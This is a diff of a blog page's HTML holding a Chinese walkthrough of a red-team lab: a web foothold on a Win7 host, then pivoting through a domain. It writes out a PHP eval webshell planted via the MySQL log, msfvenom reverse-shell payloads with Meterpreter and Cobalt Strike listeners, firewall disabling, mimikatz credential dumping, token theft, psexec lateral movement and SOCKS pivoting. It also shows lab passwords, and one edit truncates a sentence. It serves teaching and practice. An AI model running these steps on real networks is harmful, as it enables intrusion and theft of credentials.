@@ -354,23 +354,34 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali        VM2,NAT             192.168.72.130,192.168.0.128</span><br><span class="line">win7        VM2,VM1,NAT         192.168.52.143,192.168.72.129,192.168.0.178</span><br><span class="line">win2k3      VM1                 192.168.52.141</span><br><span class="line">winServer08 VM1                 192.168.52.138</span><br></pre></td></tr></table></figure>
-
-<p>通用密码为 <code>hongrisec@2019</code> 更改后的密码为<code>hongrisec@2021</code></p>
-<p>win7可以ping通所有主机，但所有主机都无法ping通win7(win7防火墙过滤了icmp,开启文件和打印机回显 imcpv4即可ping通)</p>
+        <h3 id="环境搭建">环境搭建</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali        VM2,NAT             192.168.72.130,192.168.0.128</span><br><span class="line">win7        VM2,VM1,NAT         192.168.52.143,192.168.72.129,192.168.0.178</span><br><span class="line">win2k3      VM1                 192.168.52.141</span><br><span class="line">winServer08 VM1                 192.168.52.138</span><br></pre></td></tr></table></figure>
+<p>通用密码为 <code>hongrisec@2019</code>
+更改后的密码为<code>hongrisec@2021</code></p>
+<p>win7可以ping通所有主机，但所有主机都无法ping通win7(win7防火墙过滤了icmp,开启文件和打印机回显
+imcpv4即可ping通)</p>
 <p>win2003与win2008互通</p>
 <p>(之前选择win7网络是选成了家庭网络导致无法在其他主机访问web服务，改为公用网络就i好了;使用VM1和Nat模式的win7域配置有点问题，然后就在后面内网渗透的时候重新设置了，给kali和win7配置了VM2网卡)</p>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap 192.168.0.178 -sS -Pn</code> </p>
+<h3 id="信息收集">信息收集</h3>
+<h4 id="端口扫描">端口扫描</h4>
+<p><code>nmap 192.168.0.178 -sS -Pn</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-13 20:31 CST</span><br><span class="line">Nmap scan report for 192.168.0.178</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:63:00:E0 (VMware)</span><br></pre></td></tr></table></figure>
-
 <p>开放了80端口 和 3306端口</p>
-<p>访问80端口，默认页面为phpstudy探针，得到网站绝对路径为<code>C:/phpStudy/WWW </code> 还有一个mysql数据库连接检测，输入root,root 显示成功连接数据库,可以确定得到数据库账号密码为 <code>root</code>  <code>root</code></p>
-<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>sudo dirb http://192.168.0.178</code>  dirmap只扫描出了phpmyadmin</p>
-<p><code>sudo python3 dirsearch.py -u http://192.168.0.178 -e */</code> dirsearch也只扫出来了phpmyadmin</p>
-<p><code>sudo python3 dirmap.py  -i 192.168.0.178 -lcf</code> 使用dirmap 扫到了备份文件</p>
+<p>访问80端口，默认页面为phpstudy探针，得到网站绝对路径为<code>C:/phpStudy/WWW</code>
+还有一个mysql数据库连接检测，输入root,root
+显示成功连接数据库,可以确定得到数据库账号密码为 <code>root</code>
+<code>root</code></p>
+<h4 id="目录扫描">目录扫描</h4>
+<p><code>sudo dirb http://192.168.0.178</code>
+dirmap只扫描出了phpmyadmin</p>
+<p><code>sudo python3 dirsearch.py -u http://192.168.0.178 -e */</code>
+dirsearch也只扫出来了phpmyadmin</p>
+<p><code>sudo python3 dirmap.py  -i 192.168.0.178 -lcf</code> 使用dirmap
+扫到了备份文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[200][application/x-rar-compressed][3.00mb] http://192.168.0.178/beifen.rar         </span><br><span class="line">[200][text/html][70.39kb] http://192.168.0.178/phpinfo.php                          </span><br><span class="line">[200][text/html; charset=utf-8][4.28kb] http://192.168.0.178/phpMyAdmin/            </span><br><span class="line">[200][text/html; charset=utf-8][4.28kb] http://192.168.0.178/phpMyadmin/            </span><br><span class="line">[200][text/html; charset=utf-8][4.28kb] http://192.168.0.178/phpmyadmin/            </span><br><span class="line">[200][text/html; charset=utf-8][4.28kb] http://192.168.0.178/phpmyAdmin/            </span><br><span class="line">[200][text/html; charset=utf-8][14.39kb] http://192.168.0.178//l.php  </span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="后台上传shell"><a href="#后台上传shell" class="headerlink" title="后台上传shell"></a>后台上传shell</h4><p>下载备份文件，发现为yxcms</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<h4 id="后台上传shell">后台上传shell</h4>
+<p>下载备份文件，发现为yxcms</p>
 <p>访问 <code>192.168.0.178/yxcms</code>,主页中有敏感信息泄漏</p>
 <p><img src="/posts/bb76ba56/info.png"></p>
 <p>得到后台地址和登录账号</p>
@@ -383,8 +394,10 @@
 <p><img src="/posts/bb76ba56/shell_phpinfo.png"></p>
 <p>使用蚁剑连接shell</p>
 <p><img src="/posts/bb76ba56/ant_shell.png"></p>
-<h4 id="phpmyadmin利用日志Getshell"><a href="#phpmyadmin利用日志Getshell" class="headerlink" title="phpmyadmin利用日志Getshell"></a>phpmyadmin利用日志Getshell</h4><p>弱口令<code>root</code>  <code>root</code>成功登录</p>
-<p>查看是否有写入权限 <code>show variables like &#39;%secure_file%&#39;;</code></p>
+<h4 id="phpmyadmin利用日志getshell">phpmyadmin利用日志Getshell</h4>
+<p>弱口令<code>root</code> <code>root</code>成功登录</p>
+<p>查看是否有写入权限
+<code>show variables like '%secure_file%';</code></p>
 <p>secure_file_priv 值为 NULL，不能使用 into outfile 方式写入 shell</p>
 <p><img src="/posts/bb76ba56/phpmy1.png"></p>
 <p>手动开启日志记录</p>
@@ -392,17 +405,18 @@
 <p>查看当前日志目录</p>
 <p><img src="/posts/bb76ba56/phpmy3.png"></p>
 <p>指定日志文件</p>
-<p><code>set global general_log_file = &quot;C:/phpStudy/www/1.php&quot;;</code></p>
+<p><code>set global general_log_file = "C:/phpStudy/www/1.php";</code></p>
 <p>再次查看日志目录</p>
-<p><code>show variables like &#39;general%&#39;;</code></p>
+<p><code>show variables like 'general%';</code></p>
 <p><img src="/posts/bb76ba56/phpmy4.PNG"></p>
 <p>将一句话木马写入指定的1.php</p>
-<p><code>SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code></p>
+<p><code>SELECT '&lt;?php eval($_POST["cmd"]);?&gt;'</code></p>
 <p><img src="/posts/bb76ba56/phpmy5.PNG"></p>
 <p><img src="/posts/bb76ba56/phpmy6.PNG"></p>
-<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h4><p>打开msf进行本机监听</p>
+<h3 id="内网渗透">内网渗透</h3>
+<h4 id="使用msf">使用msf</h4>
+<p>打开msf进行本机监听</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.72.130</span><br><span class="line">set lport 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
 <p>使用msfvenom生成shell.exe</p>
 <p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.72.130 lport=9999 -f exe -o shell.exe</code></p>
 <p>然后使用蚁剑上传shell.exe后执行</p>
@@ -424,32 +438,40 @@
 <p>在使用wiki的时候需要先迁移进程不然会无法正常运行</p>
 <p><img src="/posts/bb76ba56/msf_kiwi_nomigrate.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">help kiwi</span><br><span class="line"></span><br><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>使用<code>creds_all</code> 命令直接获取密码</p>
 <p><img src="/posts/bb76ba56/msf_kiwi_creds_all.png"></p>
 <p>使用<code>kiwi_cmd</code>后面接mimikatz.exe的命令</p>
 <p><code>kiwi_cmd sekurlsa::logonpasswords</code>可以得到密码<code>hongrisec@2021</code></p>
 <p><img src="/posts/bb76ba56/msf_kiwi_cmd.png"></p>
-<p>进入shell <code>netstat -ano | findstr &quot;3389&quot;</code>查看3389端口是否开放，shell突然没了相应…然后发现靶机ip自动变了..</p>
+<p>进入shell
+<code>netstat -ano | findstr "3389"</code>查看3389端口是否开放，shell突然没了相应...然后发现靶机ip自动变了..</p>
 <p>使用msf开启3389端口</p>
-<p>meterpreter &gt;<code> run post/windows/manage/enable_rdp</code></p>
+<p>meterpreter &gt;<code>run post/windows/manage/enable_rdp</code></p>
 <p><img src="/posts/bb76ba56/msf_run_rdp.png"></p>
-<p>(注：运行完该命令后突然发现连接不上shell了，去靶机看了下 网卡开启的自动获取ip，打开3389之后不知道为什么就自己换了ip，然后就在靶机上设置了固定ip 为 <code>192.168.72.136</code>)</p>
+<p>(注：运行完该命令后突然发现连接不上shell了，去靶机看了下
+网卡开启的自动获取ip，打开3389之后不知道为什么就自己换了ip，然后就在靶机上设置了固定ip
+为 <code>192.168.72.136</code>)</p>
 <p>然后再kali上尝试远程连接靶机</p>
 <p><code>sudo rdesktop 192.168.72.136</code> 输入yes</p>
-<p>使用<code>God\Administrator </code> <code>hongrisec@2021</code>成功登录</p>
+<p>使用<code>God\Administrator</code>
+<code>hongrisec@2021</code>成功登录</p>
 <p><img src="/posts/bb76ba56/msf_rdesktop.png"></p>
 <hr>
-<h4 id="使用CS连接"><a href="#使用CS连接" class="headerlink" title="使用CS连接"></a>使用CS连接</h4><p>在CS中创建beacon http监听，</p>
-<p>然后选择攻击-&gt;生产后门-&gt;Windows Executable(s),选择刚才创建的Listener生成1.exe</p>
-<br>
-
+<h4 id="使用cs连接">使用CS连接</h4>
+<p>在CS中创建beacon http监听，</p>
+<p>然后选择攻击-&gt;生产后门-&gt;Windows
+Executable(s),选择刚才创建的Listener生成1.exe</p>
+<p><br></p>
 <p>在蚁剑中关闭防火墙</p>
 <p><code>netsh advfirewall set allprofiles state off</code></p>
 <p>将生成的exe在蚁剑终端运行</p>
-<p>在Cobalt Strike中它的心跳默认是60s(即sleep时间为60s，每一分钟目标主机与teamserver通信一次), 这会让执行命令或进行其他操作响应很慢</p>
-<p><code>sleep 5</code> 设置时间为5s，如果设置值过小，流量会很明显 。</p>
-<h5 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h5><p><code>shell whoami</code></p>
+<p>在Cobalt
+Strike中它的心跳默认是60s(即sleep时间为60s，每一分钟目标主机与teamserver通信一次),
+这会让执行命令或进行其他操作响应很慢</p>
+<p><code>sleep 5</code> 设置时间为5s，如果设置值过小，流量会很明显
+。</p>
+<h5 id="系统信息收集">系统信息收集</h5>
+<p><code>shell whoami</code></p>
 <p><code>shell net user</code></p>
 <p><img src="/posts/bb76ba56/wininfo1.png"></p>
 <p><code>shell net user /domain</code></p>
@@ -457,7 +479,7 @@
 <p><code>shell ipconfig /all</code></p>
 <p><img src="/posts/bb76ba56/wininfo2.PNG"></p>
 <p><img src="/posts/bb76ba56/wininfo3.PNG"></p>
-<p><code>shell systeminfo </code></p>
+<p><code>shell systeminfo</code></p>
 <p><img src="/posts/bb76ba56/cs_shellsysteminfo.png"></p>
 <p><img src="/posts/bb76ba56/cs_shellsysteminfo2.PNG"></p>
 <p><code>shell net view</code></p>
@@ -475,22 +497,24 @@
 <p>执行CS中的<code>net view</code></p>
 <p><img src="/posts/bb76ba56/cs_netview.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">域: god.org</span><br><span class="line">域内主机: OWA   192.168.52.138</span><br><span class="line">          ROOT-TVI862UBEH   192.168.52.141</span><br><span class="line">          STU1(win7)  192.168.52.143</span><br><span class="line">域内用户: Administrator</span><br><span class="line">          ligang</span><br><span class="line">          liukaifeng01</span><br><span class="line">域控: OWA 192.168.52.138</span><br></pre></td></tr></table></figure>
-
-<h5 id="系统密码收集"><a href="#系统密码收集" class="headerlink" title="系统密码收集"></a>系统密码收集</h5><p>在CS中使用<code>hashdump</code>   <code>logonpasswords</code>  读取内存和密码</p>
+<h5 id="系统密码收集">系统密码收集</h5>
+<p>在CS中使用<code>hashdump</code> <code>logonpasswords</code>
+读取内存和密码</p>
 <p><img src="/posts/bb76ba56/password1.png"></p>
 <p>得到hash值和明文密码，密码为 <code>hongrisec@2021</code></p>
 <p>也可以使用CS中的<code>Run mimikatz</code></p>
 <p><img src="/posts/bb76ba56/run_mimikatz.png"></p>
 <p>抓到的结果可以在<code>View -&gt;  Credentials</code>中查看</p>
 <p><img src="/posts/bb76ba56/Credentials.png"></p>
-<br>
-
-<h5 id="横向探测"><a href="#横向探测" class="headerlink" title="横向探测"></a>横向探测</h5><p>使用CS中的<code>net view</code>和<code>port scan</code> 功能</p>
+<p><br></p>
+<h5 id="横向探测">横向探测</h5>
+<p>使用CS中的<code>net view</code>和<code>port scan</code> 功能</p>
 <p><img src="/posts/bb76ba56/cs_netview.png"></p>
 <p><img src="/posts/bb76ba56/cs_portscan.png"></p>
 <p>扫描出来的内容可以在target中看到</p>
 <p><img src="/posts/bb76ba56/cs_target.png"></p>
-<h6 id="使用CS的psexec"><a href="#使用CS的psexec" class="headerlink" title="使用CS的psexec"></a>使用CS的psexec</h6><p>1.先创建一个smb beacon</p>
+<h6 id="使用cs的psexec">使用CS的psexec</h6>
+<p>1.先创建一个smb beacon</p>
 <p><img src="/posts/bb76ba56/cs_new_smbbeacon.png"></p>
 <p>2.在已有的Beacon上右键选择Spawnm，选择smb beacon的listener</p>
 <p><img src="/posts/bb76ba56/cs_smb.png"></p>
@@ -498,32 +522,33 @@
 <p><img src="/posts/bb76ba56/cs_psexec1.png"></p>
 <p><img src="/posts/bb76ba56/cs_psexec2.PNG"></p>
 <p>3.使用凭证连接其他内网机器</p>
-<p>在Targets中 选择主机右键<code>jump</code>-&gt; <code>psexec</code></p>
+<p>在Targets中 选择主机右键<code>jump</code>-&gt;
+<code>psexec</code></p>
 <p><img src="/posts/bb76ba56/cs_psexec3.PNG"></p>
 <p><img src="/posts/bb76ba56/cs_psexec4.PNG"></p>
 <p>成功用此方法连接到OWA的beacon</p>
-<p>但是在连接 ROOT-TVI862UBEH时，会报错，具体原因还没找到….求解决</p>
+<p>但是在连接 ROOT-TVI862UBEH时，会报错，具体原因还没找到....求解决</p>
 <p><img src="/posts/bb76ba56/cs_psexec_error.png"></p>
-<p>4.当然也可以通过窃取GOD\Administrator的token来登录其他主机</p>
-<p>选择beacon右键-&gt;Explore-&gt;Process List-&gt;找到GOD\Administrator的进程 点击右下角的<code>steal token</code></p>
-<p>然后进入targets-&gt;jump-&gt;psexec-&gt;勾选左下方的勾 使用当前会话的token，这种方法和前面的效果相同</p>
-<br>
-
-<h5 id="CS派生msf会话"><a href="#CS派生msf会话" class="headerlink" title="CS派生msf会话"></a>CS派生msf会话</h5><p>在CS中创建一给Foreign HTTP(s)</p>
-<p><img src="/posts/bb76ba56/cs_msf1.png"> </p>
+<p>4.当然也可以通过窃取GOD</p>
+<p>选择beacon右键-&gt;Explore-&gt;Process
+List-&gt;找到GOD点击右下角的<code>steal token</code></p>
+<p>然后进入targets-&gt;jump-&gt;psexec-&gt;勾选左下方的勾
+使用当前会话的token，这种方法和前面的效果相同</p>
+<p><br></p>
+<h5 id="cs派生msf会话">CS派生msf会话</h5>
+<p>在CS中创建一给Foreign HTTP(s)</p>
+<p><img src="/posts/bb76ba56/cs_msf1.png"></p>
 <p>在msf中</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; set set payload windows/meterpreter/reverse_http</span><br><span class="line">set =&gt; payload windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.72.130</span><br><span class="line">lhost =&gt; 192.168.72.130</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 2222</span><br><span class="line">lport =&gt; 2222</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/bb76ba56/cs_msf2.png"></p>
-<br>
-
-<p>使用<code>run autoroute -s 192.168.72.0/24</code>报错 应该是在msf6中移除了</p>
-<p><code>use post/multi/manage/autoroute</code> 选择autoroute模块添加路由</p>
+<p><br></p>
+<p>使用<code>run autoroute -s 192.168.72.0/24</code>报错
+应该是在msf6中移除了</p>
+<p><code>use post/multi/manage/autoroute</code>
+选择autoroute模块添加路由</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(multi/manage/autoroute) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (post/multi/manage/autoroute):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   CMD      autoadd          yes       Specify the autoroute command (Accepted: add</span><br><span class="line">                                       , autoadd, print, delete, default)</span><br><span class="line">   NETMASK  255.255.255.0    no        Netmask (IPv4 as &quot;255.255.255.0&quot; or CIDR as</span><br><span class="line">                                       &quot;/24&quot;</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line">   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)</span><br><span class="line"></span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; set session 10</span><br><span class="line">session =&gt; 10</span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/manage/autoroute):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   CMD      autoadd          yes       Specify the autoroute command (Accepted: add</span><br><span class="line">                                       , autoadd, print, delete, default)</span><br><span class="line">   NETMASK  255.255.255.0    no        Netmask (IPv4 as &quot;255.255.255.0&quot; or CIDR as</span><br><span class="line">                                       &quot;/24&quot;</span><br><span class="line">   SESSION  10               yes       The session to run this module on.</span><br><span class="line">   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; set subnet 192.168.52.0/24</span><br><span class="line">subnet =&gt; 192.168.52.0/24</span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; run</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (incompatible session platform: windows)</span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Searching for subnets to autoroute.</span><br><span class="line"></span><br><span class="line">[+] Route added to subnet 169.254.0.0/255.255.0.0 from host&#x27;s routing table.</span><br><span class="line">[+] Route added to subnet 192.168.52.0/255.255.255.0 from host&#x27;s routing table.</span><br><span class="line">[+] Route added to subnet 192.168.72.0/255.255.255.0 from host&#x27;s routing table.</span><br><span class="line">[*] Post module execution completed</span><br><span class="line"></span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; route print</span><br><span class="line"></span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   169.254.0.0        255.255.0.0        Session 10</span><br><span class="line">   192.168.52.0       255.255.255.0      Session 10</span><br><span class="line">   192.168.72.0       255.255.255.0      Session 10</span><br><span class="line"></span><br><span class="line">[*] There are currently no IPv6 routes defined.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>设置代理</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(multi/manage/autoroute) &gt; use auxiliary/server/socks_proxy</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/socks_proxy):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD                   no        Proxy password for SOCKS5 listener</span><br><span class="line">   SRVHOST   0.0.0.0          yes       The address to listen on</span><br><span class="line">   SRVPORT   1080             yes       The port to listen on</span><br><span class="line">   USERNAME                   no        Proxy username for SOCKS5 listener</span><br><span class="line">   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy  Run a SOCKS proxy server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; set version 5</span><br><span class="line">version =&gt; 5</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; </span><br><span class="line">[*] Starting the SOCKS proxy server</span><br><span class="line">Interrupt: use the &#x27;exit&#x27; command to quit</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 1.</span><br><span class="line"></span><br><span class="line">[*] Starting the SOCKS proxy server</span><br><span class="line">[*] Stopping the SOCKS proxy server</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>配置proxychains4</p>
 <p><code>sudo vim /etc/proxychains4.conf</code></p>
 <p>添加 <code>socks5 127.0.0.1 1080</code></p>
@@ -531,21 +556,20 @@
 <p><code>proxychains4 curl http://192.168.52.143/</code> 成功访问到</p>
 <p><img src="/posts/bb76ba56/proxy.png"></p>
 <p>使用代理访问内网中192.168.52.141的机器</p>
-<p><code>proxychains4 nmap -Pn -sT 192.168.52.141</code>nmap扫描一下端口，扫了很长时间……</p>
+<p><code>proxychains4 nmap -Pn -sT 192.168.52.141</code>nmap扫描一下端口，扫了很长时间......</p>
 <p><img src="/posts/bb76ba56/nmap_output.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.52.141</span><br><span class="line">Host is up (1.5s latency).</span><br><span class="line">Not shown: 987 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">777/tcp  open  multiling-http</span><br><span class="line">1025/tcp open  NFS-or-IIS</span><br><span class="line">1028/tcp open  unknown</span><br><span class="line">1029/tcp open  ms-lsa</span><br><span class="line">1030/tcp open  iad1</span><br><span class="line">6002/tcp open  X11:2</span><br><span class="line">7001/tcp open  afs3-callback</span><br><span class="line">7002/tcp open  afs3-prserver</span><br><span class="line">8099/tcp open  unknown</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>也可以使用msf中的<code>auxiliary/scanner/portscan/tcp</code>跑一下开放端口</p>
 <p><img src="/posts/bb76ba56/msf_portscan_tcp.png"></p>
-<p>先利用smb扫描系统版本 <code>auxiliary/scanner/smb/smb_version</code></p>
+<p>先利用smb扫描系统版本
+<code>auxiliary/scanner/smb/smb_version</code></p>
 <p><img src="/posts/bb76ba56/msf_smb.png"></p>
 <p><img src="/posts/bb76ba56/msf_smb2.png"></p>
 <p><img src="/posts/bb76ba56/msf_smb3.png"></p>
 <p>使用msf扫描模块检测是否存在ms17-010漏洞</p>
